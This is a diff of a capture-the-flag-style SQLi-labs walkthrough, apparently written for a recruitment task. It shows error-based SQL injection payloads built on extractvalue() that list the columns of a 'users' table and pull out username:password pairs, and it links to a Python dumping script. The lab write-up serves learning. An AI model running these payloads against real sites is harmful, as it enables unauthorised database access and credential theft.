@@ -55,7 +55,6 @@ So here we use extractvalue()
 3) Then we can view columns in users table by
    `?id=1'  and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1)))--+`
    `?id=1'  and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1)))--+`
-5)  Then we can dump the data by iterating over the values by
+5)  Then we can extract the data by iterating over the values by
    `?id=1' and extractvalue(0x0a,concat(0x0a,(select concat(username,':',password) from users limit 0,1)))--+`
-
- 
+we can then dump the data by writing a python code [Click here for the code](https://github.com/koppakaajay/bi0s_recruitment/blob/main/sqlilabs5.py)
